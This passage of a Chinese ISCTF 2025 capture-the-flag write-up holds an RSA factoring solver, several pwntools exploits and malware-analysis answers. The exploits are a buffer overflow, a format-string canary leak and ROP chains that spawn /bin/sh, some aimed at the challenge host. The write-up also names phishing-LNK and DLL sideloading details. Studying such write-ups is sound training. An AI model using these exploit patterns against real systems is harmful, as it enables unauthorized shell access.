        <span class="token keyword">if</span> numerator <span class="token operator">%</span> denominator <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            c <span class="token operator">=</span> numerator <span class="token operator">//</span> denominator
            flag_bytes <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>c<span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[SUCCESS] Flag found:\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            found <span class="token operator">=</span> <span class="token boolean">True</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] a, b 正确但 c 无法整除，奇怪。"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> <span class="token keyword">not</span> found<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 未能找到解，请检查 K1, K3 是否有误。"</span><span class="token punctuation">)</span></code></pre>


<h3 id="小蓝鲨的费马谜题"><a href="#小蓝鲨的费马谜题" class="headerlink" title="小蓝鲨的费马谜题"></a>小蓝鲨的费马谜题</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math
<span class="token keyword">import</span> re
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token punctuation">,</span> inverse

<span class="token comment"># ---------------- 配置区域 ----------------</span>
<span class="token comment"># 题目给出的 n 和 c </span>
n <span class="token operator">=</span> <span class="token number">16926747183730811445521182287631871095235807124637325096660759361996155369993998745638293862726267741890840654094794027600177564948819372030933079291097084177091863985749240756085243654442374722882507015343515827787141307909182820013354070321738405810257107651857739607060274549412692517140259717346170524920540888050323066988108836911975466603073034433831887208978130406742714302940264702874305095602623379177353873347208751721068498690917932776984190598143704567665475161453335629659200748786648288309401513856740323455946901312988841290917666732077747457081355853722832166331501779601157719722291598787710746917947</span>
e <span class="token operator">=</span> <span class="token number">65537</span>
c <span class="token operator">=</span> <span class="token number">7135669888508993283998887257526185813831780208680788333332044930342125381561919830084088631920301623909949443002073193381401761901398826719665411432016217400457613545308262831975564456231165114091904748808206330488231569773162745696602366468753664188261933014198218922459715972876740957260132243927549037840265753282534565674280908439875550179801788711737901632349136780584007599655055605772651127003711138512998683145763743839326460319440186099818507078433271291685194944254795690424327192625258701835654639832285402990995662846426561789508331799972329711410217802657682842382105869446853207634070295959281375484933</span>

<span class="token comment"># 这里粘贴了 output.txt 中的所有 Hints 数据 [cite: 1, 2, 3]</span>
hints_data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
Hint 1: 11, 41, 403072318395713195475880235840306655046644537786837658466183670390322357403650602210882802453171853452
Hint 2: 73, 7, 3401877351823051464833008106697922874740843547186522246399577691648145322938787488999079423405760696040635223407580102549819096176975820017380148265275786281647240647714533261221890310813882987089721138616513427711006945061727486708277298401545762448776593105730005387022319319199166969225690343981500127626848336242187816071435842118963634505746771844269484845077330851526393327015758760003053231670737896550596266539249975891234238005583184203089180325261872944167834576158878843510707348603774425827560724587546720860765943393963597645881666559247252842017499263265738255716811999328445725902262302532911214255949
Hint 23: 41, 97, 15061728396574720128871454281806425283902878531290205263072044930084328354647716799950058691868870125292816458036423472349601649870044904984377004711678761714808846252355372756850495640148784156530292575757175420916873271609977179541391067607437946628688811886889502712607514447458904992024279765998865875618672417318528806259694052202283848620150531327490085874935926140164888318138777816635210686133434879564761574366090585467327313351792501721900090022412568322566880308204689579089754113916523137219409702840025596606460438071507115794360457519041650146002247978792944063933568992230154174930543323173071240960636
Hint 48: 47, 73, 11137871466581047781242984634852964336706264103460602528475970728553465644713327296350923627071860721778412789236714773697433892321959279504008377433584604885817319604115996426320874382244073671694322092160768350159529231732048447670177579115854882538413223938721279445190025525651472499343624011272214336778696111400347742318222789215043195711269360705507743463500549755479755775737105743290208621332589467304719937369513194207595213182980370357559166180993485168866418076474829491707312908665547905615295104716814273672708222960604034067248688735024594069804630472429600684961470444745009128678939204098625367015452
"""</span>
<span class="token comment"># (脚本会处理这些hint，不用担心不全，上面几个只是例子)</span>

<span class="token comment"># ---------------- 攻击逻辑 ----------------</span>

<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 1. 使用正则表达式匹配所有的 (数字, 数字, 长数字) 组合</span>
    <span class="token comment"># 这样可以忽略文件中的 "Hint x:"、"" 等杂乱字符</span>
    pattern <span class="token operator">=</span> <span class="token string">r'(\d+),\s*(\d+),\s*(\d+)'</span>
    
    <span class="token comment"># 这里为了保证能跑到所有数据，我建议你把 output.txt 的全文再贴到 hints_data 变量里</span>
    <span class="token comment"># 或者直接把文件和脚本放一起读</span>
    <span class="token comment"># 为了演示方便，我假设你会把文件全文放在同目录下，或者直接复制内容替换上面的 hints_data</span>
    <span class="token comment"># 下面代码优先读文件，读不到就用上面的字符串</span>
    
    content <span class="token operator">=</span> hints_data
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
            content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] 成功读取 output.txt 文件"</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] 未找到 output.txt，使用脚本内置的 hints_data (请确保数据完整)"</span><span class="token punctuation">)</span>

    matches <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*] 共提取到 </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>matches<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string"> 组 Hint，开始爆破..."</span></span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i<span class="token punctuation">,</span> <span class="token keyword">match</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>matches<span class="token punctuation">)</span><span class="token punctuation">:</span>
        base1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        base2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        hint_val <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

        <span class="token comment"># 核心攻击：p = gcd(hint - 2, n)</span>
        p <span class="token operator">=</span> math<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span>hint_val <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>

        <span class="token comment"># 检查是否成功分解</span>
        <span class="token keyword">if</span> p <span class="token operator">></span> <span class="token number">1</span> <span class="token keyword">and</span> p <span class="token operator">&lt;</span> n<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[+] 成功! 在第 </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string"> 个 Hint (Base: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>base1<span class="token punctuation">&#125;</span></span><span class="token string">, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>base2<span class="token punctuation">&#125;</span></span><span class="token string">) 处分解了 n"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[+] p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>p<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            
            q <span class="token operator">=</span> n <span class="token operator">//</span> p
            phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
            
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
                m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
                flag <span class="token operator">=</span> long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[+] FLAG: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> ex<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] 解密报错: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>ex<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[-] Decrypted hex: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] 所有 Hint 都尝试失败。请检查输入数据是否包含完整的 Hint 行。"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    attack<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="来签个到吧-1"><a href="#来签个到吧-1" class="headerlink" title="来签个到吧"></a>来签个到吧</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'challenge.bluesharkinfo.com'</span><span class="token punctuation">,</span><span class="token number">29242</span><span class="token punctuation">)</span>
payload  <span class="token operator">=</span> <span class="token string">b'A'</span> <span class="token operator">*</span> <span class="token number">108</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0xaddaaaaa</span><span class="token punctuation">)</span>  
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>         </code></pre>


<h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> re

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>   <span class="token comment"># 不想看太多日志可以改成 'info' 或 'error'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./ez_fmt'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> process<span class="token punctuation">(</span><span class="token string">'./ez_fmt'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> start<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment">#canary</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"1st input:"</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"%23$p"</span><span class="token punctuation">)</span>
    leak <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"[leak end]"</span><span class="token punctuation">)</span>
    m <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"0x[0-9a-fA-F]+"</span><span class="token punctuation">,</span> leak<span class="token punctuation">)</span>
    canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"leaked canary = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    <span class="token comment"># ret2win</span>
    win_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win'</span><span class="token punctuation">]</span>
    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"win() addr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"2nd input:"</span><span class="token punctuation">)</span>

    payload  <span class="token operator">=</span> <span class="token string">b"A"</span> <span class="token operator">*</span> <span class="token number">0x88</span>        
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>        
    payload <span class="token operator">+=</span> <span class="token string">b"B"</span> <span class="token operator">*</span> <span class="token number">8</span>            
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>win_addr<span class="token punctuation">)</span>  
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="ret2rop"><a href="#ret2rop" class="headerlink" title="ret2rop"></a>ret2rop</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
<span class="token comment">#exe = './pwn'</span>
<span class="token comment">#elf = ELF(exe)</span>
io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'challenge.bluesharkinfo.com'</span><span class="token punctuation">,</span><span class="token number">12346</span><span class="token punctuation">)</span>
name_addr <span class="token operator">=</span> <span class="token number">0x4040F0</span> 
pop_rsi_addr <span class="token operator">=</span> <span class="token number">0x401a1c</span>
mov_rdi_rsi_addr <span class="token operator">=</span> <span class="token number">0x401a25</span>
system_addr <span class="token operator">=</span> <span class="token number">0x401180</span>
pop_rbp_ret<span class="token operator">=</span><span class="token number">0x40131d</span>
<span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    system_addr <span class="token operator">=</span> <span class="token number">0x401180</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"demo"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"no"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"name"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># 1. 设置 n (Offset 64) 为 payload 总长度。</span>
    <span class="token comment"># 2. 设置 Offset 96 也为 payload 总长度。</span>
    <span class="token comment"># 3. 当 i=64 时，n ^= buf[96] -> n = 0。循环终止。</span>
    <span class="token comment"># 4. 循环终止后，Offset 88 处的 Ret Address 保持原样（未被异或）。</span>
    <span class="token comment"># 5. Offset 88 处放置 skip_gadget，弹掉 Offset 96，跳到 Offset 104。</span>
    payload_len <span class="token operator">=</span> <span class="token number">0xE0</span> 
    payload <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">64</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> <span class="token string">b'B'</span> <span class="token operator">*</span> <span class="token number">8</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rbp_ret<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>payload_len<span class="token punctuation">)</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rsi_addr<span class="token punctuation">)</span>     <span class="token comment"># pop rsi</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>name_addr<span class="token punctuation">)</span>        <span class="token comment"># /bin/sh</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_rdi_rsi_addr<span class="token punctuation">)</span> <span class="token comment"># mov rdi, rsi</span>
    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>      <span class="token comment"># system</span>
    
    current_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
    padding_len <span class="token operator">=</span> payload_len <span class="token operator">-</span> current_len
    
    payload <span class="token operator">+=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> padding_len
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"yourself"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    attack<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<h3 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h3><p>&#x2F;bin&#x2F;sh写道存储name的buff里即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># ================= 配置部分 =================</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
binary_name <span class="token operator">=</span> <span class="token string">'./ez2048'</span> 
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary_name<span class="token punctuation">)</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary_name<span class="token punctuation">)</span> 
<span class="token comment">#io = remote('challenge.bluesharkinfo.com', 29823) # ⚠️ 请确认端口</span>

pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x40133E</span>    <span class="token comment"># ROP gadget: pop rdi; ret</span>
name_buf_addr <span class="token operator">=</span> <span class="token number">0x404A46</span>  <span class="token comment"># 全局变量地址，我们在那里写入 /bin/sh</span>
system_addr <span class="token operator">=</span> <span class="token number">0x401355</span>    <span class="token comment"># system 函数地址 (或者 PLT 地址)</span>
<span class="token comment"># ret_gadget = 0x40101a   # 用于栈对齐 (可选)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input your name\n>"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span> 
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Press \"Enter\" to start"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b""</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span> 
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"q"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"your score:"</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter \"Q\" to settle"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"Q"</span><span class="token punctuation">)</span> 
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b"n"</span><span class="token punctuation">)</span> 

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Phase 3: Leaking Canary..."</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">)</span>
payload_leak <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">136</span> <span class="token operator">+</span> <span class="token string">b'b'</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_leak<span class="token punctuation">)</span> 
io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"executing command: "</span><span class="token punctuation">)</span>
all_output <span class="token operator">=</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"$ "</span><span class="token punctuation">)</span>

start_idx <span class="token operator">=</span> all_output<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">136</span> <span class="token operator">+</span> <span class="token string">b'b'</span><span class="token punctuation">)</span>
canary_offset <span class="token operator">=</span> start_idx <span class="token operator">+</span> <span class="token number">137</span>
canary_raw <span class="token operator">=</span> all_output<span class="token punctuation">[</span>canary_offset <span class="token punctuation">:</span> canary_offset <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">]</span>
canary <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">b'\x00'</span> <span class="token operator">+</span> canary_raw<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"\n[+] SUCCESS! Leaked Canary: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Phase 4: Sending ROP Chain..."</span><span class="token punctuation">)</span>

prefix <span class="token operator">=</span> <span class="token string">b"exit\x00"</span>
padding_len <span class="token operator">=</span> <span class="token number">136</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span>
payload_attack <span class="token operator">=</span> prefix
payload_attack <span class="token operator">+=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> padding_len
payload_attack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span>        <span class="token comment"># 恢复 Canary</span>
payload_attack <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>             <span class="token comment"># Saved RBP (无所谓)</span>
payload_attack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>   <span class="token comment"># 把栈顶数据弹入 rdi</span>
payload_attack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>name_buf_addr<span class="token punctuation">)</span> <span class="token comment"># rdi = 0x404A46 (即 "/bin/sh")</span>
payload_attack <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>   <span class="token comment"># call system</span>

io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload_attack<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Exploit sent. Check your shell!"</span><span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
````````````
`


<span class="token comment">## 病毒分析</span>

!<span class="token punctuation">[</span>image<span class="token punctuation">.</span>png<span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>tuchuang<span class="token operator">-</span><span class="token number">1322890938</span><span class="token punctuation">.</span>cos<span class="token punctuation">.</span>ap<span class="token operator">-</span>shanghai<span class="token punctuation">.</span>myqcloud<span class="token punctuation">.</span>com<span class="token operator">/</span>pictures<span class="token operator">/</span><span class="token number">20251203110516</span><span class="token punctuation">.</span>png<span class="token punctuation">)</span>

病毒分析<span class="token operator">-</span>题目<span class="token number">1</span>
</code></pre>
<p>题目模仿的APT组织中文代号为</p>
<pre class="language-none"><code class="language-none">攻击套路就是钓鱼 pdf绑定命令执行然后白加黑，试一下几个常见的apt组织i
</code></pre>
<p>海莲花</p>
<pre class="language-none"><code class="language-none">
### 病毒分析-题目2
第一阶段载荷中的入口文件全名为</code></pre>
<p>ISCTF基础规则说明文档.pdf.lnk</p>
<pre class="language-none"><code class="language-none">
### 病毒分析-题目3
第一阶段中使用了一个带有数字签名的文件（非系统文件），其中签名者名称为（完整复制）
![image.png](https:&#x2F;&#x2F;tuchuang-1322890938.cos.ap-shanghai.myqcloud.com&#x2F;pictures&#x2F;20251203105735.png)
</code></pre>
<p>Zoom Video Communications, Inc.</p>
<pre class="language-none"><code class="language-none">
### 病毒分析-题目4

第一阶段中恶意载荷释放的文件名分别为（提交三次，每次一个文件名）
</code></pre>
<p>ISCTF2025基础规则说明文档.pdf<br>zRC.dat<br>zRCAppCore.dll</p>
<pre class="language-none"><code class="language-none">
第二阶段使用了一种常见的白加黑技巧，其中黑文件名为</code></pre>
<p>zRCAppCore.dll</p>
<pre class="language-none"><code class="language-none">### 病毒分析-题目5

### 病毒分析-题目6
![image.png](https:&#x2F;&#x2F;tuchuang-1322890938.cos.ap-shanghai.myqcloud.com&#x2F;pictures&#x2F;20251203133757.png)
</code></pre>
<p>xor</p>
<pre class="language-none"><code class="language-none">
### 病毒分析-题目7

第二阶段对下一阶段载荷进行了简单的保护，保护使用的密码为
</code></pre>
<p>tf7*TV&amp;8u</p>
<pre class="language-none"><code class="language-none">
### 病毒分析-题目8
第三阶段载荷使用了一种开源的保护工具，工具英文缩写为</code></pre>
<p>tao@kali [&#x2F;tmp] ➜  upx -d download\ (1).exe                                                                                         [13:42:03]<br>                       Ultimate Packer for eXecutables<br>                          Copyright (C) 1996 - 2024<br>UPX 4.2.4       Markus Oberhumer, Laszlo Molnar &amp; John Reiser    May 9th 2024</p>
<pre><code>    File size         Ratio      Format      Name
</code></pre>
<hr>
<pre><code>173056 &lt;-     80384   46.45%    win32/pe     download (1).exe
</code></pre>
<p>Unpacked 1 file.</p>
<pre class="language-none"><code class="language-none"></code></pre>
<p>upx</p>
<pre class="language-none"><code class="language-none">

### 病毒分析-题目9
